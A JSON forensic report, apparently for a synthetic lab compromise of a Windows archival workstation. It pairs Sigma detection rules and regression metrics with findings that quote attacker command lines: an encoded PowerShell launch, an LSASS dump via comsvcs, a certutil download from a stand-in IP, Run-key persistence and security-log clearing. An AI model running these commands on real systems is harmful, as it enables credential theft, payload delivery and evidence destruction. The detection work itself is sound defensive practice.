@@ -1,0 +1,327 @@
+{
+  "case_id": "VESPER-CASE-2026-ARC04",
+  "case_title": "Archival Workstation ARC-WS-04 Compromise Investigation (Synthetic Laboratory Case)",
+  "generated_at": "2026-11-26T02:11:44.714377+00:00",
+  "historical_uemf_provenance": {
+    "artifact_name": "62EA0032-532F-447D-B4C8-B3D6D84C8AF2.qcow2",
+    "storage_classification": "Read-only historical UEMF academic evidence (external archive; not redistributed in repo)",
+    "size_bytes": 30906007552,
+    "verified_sha256": "d0ca8894ba0b9486093a1ca9275d97f389216aec84eaf731d9fe13e0130370d2",
+    "platform_constraint_documented": "Original UEMF Windows 11 ARM VM on Apple Silicon (UTM) encountered native Sysmon kernel driver incompatibility on ARM64; VESPER therefore separates this historical acquisition provenance from the reproducible laboratory case and runs live Windows PowerShell triage validation on x64 windows-latest CI."
+  },
+  "evidence_manifests": [
+    {
+      "artifact": "sample_incident_telemetry.json",
+      "format": "Normalized JSON Triage Bundle",
+      "size_bytes": 3219,
+      "sha256": "ab05e38e03ce45001c524e5cfa56ac2062e7812d756534251035bfb7d0b7a3ab",
+      "records_parsed": 7,
+      "provenance": "laboratory_synthetic_archival_case"
+    }
+  ],
+  "compiled_sigma_rules": [
+    {
+      "rule_id": "f7299a38-5182-411a-bc04-89104081c991",
+      "title": "Suspicious PowerShell Web Request & Memory Execution (Event ID 4104)",
+      "level": "high",
+      "source_file": "posh_ps_scriptblock_suspicious_download.yml",
+      "mitre_tags": [
+        "attack.execution",
+        "attack.t1059.001"
+      ],
+      "splunk_spl": "source IN (\"WinEventLog:Microsoft-Windows-PowerShell/Operational\", \"WinEventLog:PowerShellCore/Operational\") EventCode=4104 ScriptBlockText IN (\"*Net.WebClient*\", \"*DownloadString*\", \"*DownloadFile*\", \"*Invoke-WebRequest*\", \"*iwr *\", \"*irm *\") ScriptBlockText=\"*Invoke-Expression*\"",
+      "elastic_lucene": "(winlog.channel:(Microsoft\\-Windows\\-PowerShell\\/Operational OR PowerShellCore\\/Operational)) AND ((winlog.event_data.source:(WinEventLog\\:Microsoft\\-Windows\\-PowerShell\\/Operational OR WinEventLog\\:PowerShellCore\\/Operational)) AND (winlog.event_data.EventCode:4104 AND (powershell.file.script_block_text:(*Net.WebClient* OR *DownloadString* OR *DownloadFile* OR *Invoke\\-WebRequest* OR *iwr\\ * OR *irm\\ *)) AND powershell.file.script_block_text:*Invoke\\-Expression*))"
+    },
+    {
+      "rule_id": "6d41c912-3b88-4e64-9a4a-55d204b8e201",
+      "title": "Suspicious Certutil Download Utility Execution",
+      "level": "high",
+      "source_file": "proc_creation_win_certutil_download.yml",
+      "mitre_tags": [
+        "attack.command_and_control",
+        "attack.t1105"
+      ],
+      "splunk_spl": "Image=\"*\\\\certutil.exe\" CommandLine IN (\"*urlcache*\", \"*verifyctl*\")",
+      "elastic_lucene": "process.executable.caseless:*\\\\certutil.exe AND (process.command_line:(*urlcache* OR *verifyctl*))"
+    },
+    {
+      "rule_id": "b128f731-2943-4dc9-9832-72314ad31056",
+      "title": "LSASS Memory Dump via Comsvcs DLL MiniDump",
+      "level": "critical",
+      "source_file": "proc_creation_win_lsass_dump_comsvcs.yml",
+      "mitre_tags": [
+        "attack.credential_access",
+        "attack.t1003.001"
+      ],
+      "splunk_spl": "Image=\"*\\\\rundll32.exe\" CommandLine IN (\"*comsvcs.dll*\", \"*comsvcs*\") CommandLine=\"*MiniDump*\"",
+      "elastic_lucene": "process.executable.caseless:*\\\\rundll32.exe AND (process.command_line:(*comsvcs.dll* OR *comsvcs*)) AND process.command_line:*MiniDump*"
+    },
+    {
+      "rule_id": "4a3e218b-592b-426b-9442-1678d8a7c211",
+      "title": "Suspicious PowerShell Base64 Encoded Command Execution",
+      "level": "high",
+      "source_file": "proc_creation_win_powershell_base64_encoded.yml",
+      "mitre_tags": [
+        "attack.execution",
+        "attack.t1059.001"
+      ],
+      "splunk_spl": "Image IN (\"*\\\\powershell.exe\", \"*\\\\pwsh.exe\") CommandLine IN (\"* -enc *\", \"* -encodedcommand *\", \"* -e *\", \"* -ec *\")",
+      "elastic_lucene": "(process.executable.caseless:(*\\\\powershell.exe OR *\\\\pwsh.exe)) AND (process.command_line:(*\\ \\-enc\\ * OR *\\ \\-encodedcommand\\ * OR *\\ \\-e\\ * OR *\\ \\-ec\\ *))"
+    },
+    {
+      "rule_id": "c4e1837a-4299-4c8a-b941-89314981d77a",
+      "title": "Persistence via Windows Registry Run Keys",
+      "level": "medium",
+      "source_file": "registry_set_run_key_persistence.yml",
+      "mitre_tags": [
+        "attack.persistence",
+        "attack.t1547.001"
+      ],
+      "splunk_spl": "TargetObject IN (\"*\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\*\", \"*\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*\")",
+      "elastic_lucene": "registry.path:(*\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\* OR *\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*)"
+    },
+    {
+      "rule_id": "9b23e401-7f12-4c99-a771-1188a5520914",
+      "title": "Windows Security or System Event Log Cleared via Wevtutil",
+      "level": "critical",
+      "source_file": "win_security_eventlog_cleared.yml",
+      "mitre_tags": [
+        "attack.defense_evasion",
+        "attack.t1070.001"
+      ],
+      "splunk_spl": "Image=\"*\\\\wevtutil.exe\" CommandLine IN (\"* cl *\", \"* clear-log *\")",
+      "elastic_lucene": "process.executable.caseless:*\\\\wevtutil.exe AND (process.command_line:(*\\ cl\\ * OR *\\ clear\\-log\\ *))"
+    }
+  ],
+  "regression_summary": {
+    "total_cases": 12,
+    "counts": {
+      "tp": 6,
+      "fp": 0,
+      "tn": 6,
+      "fn": 0
+    },
+    "metrics": {
+      "precision_pct": 100.0,
+      "recall_pct": 100.0,
+      "false_positive_rate_pct": 0.0,
+      "f1_pct": 100.0
+    },
+    "cases": [
+      {
+        "case_id": "ATK-PS-B64",
+        "expected_attack": true,
+        "expected_rule": "proc_creation_win_powershell_base64_encoded.yml",
+        "matched_rules": [
+          "proc_creation_win_powershell_base64_encoded.yml"
+        ],
+        "verdict": "TP",
+        "description": "PowerShell Base64 encoded command execution (T1059.001)"
+      },
+      {
+        "case_id": "ATK-LSASS-COMSVCS",
+        "expected_attack": true,
+        "expected_rule": "proc_creation_win_lsass_dump_comsvcs.yml",
+        "matched_rules": [
+          "proc_creation_win_lsass_dump_comsvcs.yml"
+        ],
+        "verdict": "TP",
+        "description": "LSASS memory dump via rundll32 comsvcs.dll MiniDump (T1003.001)"
+      },
+      {
+        "case_id": "ATK-REG-RUN",
+        "expected_attack": true,
+        "expected_rule": "registry_set_run_key_persistence.yml",
+        "matched_rules": [
+          "registry_set_run_key_persistence.yml"
+        ],
+        "verdict": "TP",
+        "description": "Registry Run key persistence modification (T1547.001)"
+      },
+      {
+        "case_id": "ATK-PS-CRADLE",
+        "expected_attack": true,
+        "expected_rule": "posh_ps_scriptblock_suspicious_download.yml",
+        "matched_rules": [
+          "posh_ps_scriptblock_suspicious_download.yml"
+        ],
+        "verdict": "TP",
+        "description": "PowerShell ScriptBlock 4104 DownloadString + Invoke-Expression (T1059.001)"
+      },
+      {
+        "case_id": "ATK-CERTUTIL-DL",
+        "expected_attack": true,
+        "expected_rule": "proc_creation_win_certutil_download.yml",
+        "matched_rules": [
+          "proc_creation_win_certutil_download.yml"
+        ],
+        "verdict": "TP",
+        "description": "Certutil urlcache remote transfer (T1105)"
+      },
+      {
+        "case_id": "ATK-WEVTUTIL-CL",
+        "expected_attack": true,
+        "expected_rule": "win_security_eventlog_cleared.yml",
+        "matched_rules": [
+          "win_security_eventlog_cleared.yml"
+        ],
+        "verdict": "TP",
+        "description": "Wevtutil Security event log clearing (T1070.001)"
+      },
+      {
+        "case_id": "BEN-PS-ADMIN",
+        "expected_attack": false,
+        "expected_rule": null,
+        "matched_rules": [],
+        "verdict": "TN",
+        "description": "Legitimate PowerShell disk space inventory script"
+      },
+      {
+        "case_id": "BEN-RUNDLL-PRINT",
+        "expected_attack": false,
+        "expected_rule": null,
+        "matched_rules": [],
+        "verdict": "TN",
+        "description": "Legitimate rundll32 printer configuration call"
+      },
+      {
+        "case_id": "BEN-REG-EXPLORER",
+        "expected_attack": false,
+        "expected_rule": null,
+        "matched_rules": [],
+        "verdict": "TN",
+        "description": "Benign Explorer UI preference registry write"
+      },
+      {
+        "case_id": "BEN-PS-4104-SAFE",
+        "expected_attack": false,
+        "expected_rule": null,
+        "matched_rules": [],
+        "verdict": "TN",
+        "description": "Legitimate PowerShell 4104 ScriptBlock checking service status"
+      },
+      {
+        "case_id": "BEN-CERTUTIL-DUMP",
+        "expected_attack": false,
+        "expected_rule": null,
+        "matched_rules": [],
+        "verdict": "TN",
+        "description": "Legitimate PKI administrator viewing local certificate store"
+      },
+      {
+        "case_id": "BEN-WEVTUTIL-QE",
+        "expected_attack": false,
+        "expected_rule": null,
+        "matched_rules": [],
+        "verdict": "TN",
+        "description": "Legitimate SOC script querying recent event log counts"
+      }
+    ]
+  },
+  "verified_findings": [
+    {
+      "finding_id": "FND-001",
+      "classification": "VERIFIED_ARTIFACT_FINDING",
+      "timestamp": "2026-11-24T09:14:02Z",
+      "rule_id": "4a3e218b-592b-426b-9442-1678d8a7c211",
+      "title": "Suspicious PowerShell Base64 Encoded Command Execution",
+      "severity": "HIGH",
+      "mitre_tags": [
+        "attack.execution",
+        "attack.t1059.001"
+      ],
+      "host": "ARC-WS-04",
+      "user": "ARCHIVES\\j.moreau",
+      "evidence_summary": "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
+    },
+    {
+      "finding_id": "FND-002",
+      "classification": "VERIFIED_ARTIFACT_FINDING",
+      "timestamp": "2026-11-24T09:15:10Z",
+      "rule_id": "f7299a38-5182-411a-bc04-89104081c991",
+      "title": "Suspicious PowerShell Web Request & Memory Execution (Event ID 4104)",
+      "severity": "HIGH",
+      "mitre_tags": [
+        "attack.execution",
+        "attack.t1059.001"
+      ],
+      "host": "ARC-WS-04",
+      "user": "ARCHIVES\\j.moreau",
+      "evidence_summary": ""
+    },
+    {
+      "finding_id": "FND-003",
+      "classification": "VERIFIED_ARTIFACT_FINDING",
+      "timestamp": "2026-11-24T09:16:18Z",
+      "rule_id": "b128f731-2943-4dc9-9832-72314ad31056",
+      "title": "LSASS Memory Dump via Comsvcs DLL MiniDump",
+      "severity": "CRITICAL",
+      "mitre_tags": [
+        "attack.credential_access",
+        "attack.t1003.001"
+      ],
+      "host": "ARC-WS-04",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence_summary": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 656 C:\\Temp\\dump.bin full"
+    },
+    {
+      "finding_id": "FND-004",
+      "classification": "VERIFIED_ARTIFACT_FINDING",
+      "timestamp": "2026-11-24T09:17:04Z",
+      "rule_id": "6d41c912-3b88-4e64-9a4a-55d204b8e201",
+      "title": "Suspicious Certutil Download Utility Execution",
+      "severity": "HIGH",
+      "mitre_tags": [
+        "attack.command_and_control",
+        "attack.t1105"
+      ],
+      "host": "ARC-WS-04",
+      "user": "ARCHIVES\\j.moreau",
+      "evidence_summary": "certutil.exe -urlcache -split -f http://198.51.100.44/tool.bin C:\\Temp\\tool.bin"
+    },
+    {
+      "finding_id": "FND-005",
+      "classification": "VERIFIED_ARTIFACT_FINDING",
+      "timestamp": "2026-11-24T09:18:45Z",
+      "rule_id": "c4e1837a-4299-4c8a-b941-89314981d77a",
+      "title": "Persistence via Windows Registry Run Keys",
+      "severity": "MEDIUM",
+      "mitre_tags": [
+        "attack.persistence",
+        "attack.t1547.001"
+      ],
+      "host": "ARC-WS-04",
+      "user": "ARCHIVES\\j.moreau",
+      "evidence_summary": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ArchiveSyncUpdater /d C:\\Temp\\tool.bin /f"
+    },
+    {
+      "finding_id": "FND-006",
+      "classification": "VERIFIED_ARTIFACT_FINDING",
+      "timestamp": "2026-11-24T09:21:30Z",
+      "rule_id": "9b23e401-7f12-4c99-a771-1188a5520914",
+      "title": "Windows Security or System Event Log Cleared via Wevtutil",
+      "severity": "CRITICAL",
+      "mitre_tags": [
+        "attack.defense_evasion",
+        "attack.t1070.001"
+      ],
+      "host": "ARC-WS-04",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence_summary": "wevtutil.exe cl Security"
+    }
+  ],
+  "analyst_hypotheses": [
+    {
+      "hypothesis_id": "HYP-001",
+      "classification": "ANALYST_HYPOTHESIS_UNCONFIRMED",
+      "statement": "Initial access may have originated from a phishing attachment opened under ARCHIVES\\j.moreau prior to T1059.001.",
+      "required_corroboration": "Email gateway logs, browser download history, and NTFS Zone.Identifier ADS."
+    },
+    {
+      "hypothesis_id": "HYP-002",
+      "classification": "ANALYST_HYPOTHESIS_UNCONFIRMED",
+      "statement": "Credential material from LSASS dump (T1003.001) could have been staged for lateral movement before log clearing (T1070.001).",
+      "required_corroboration": "Domain controller Kerberos/NTLM Event ID 4624/4768 logs and network firewall flows."
+    }
+  ]
+}
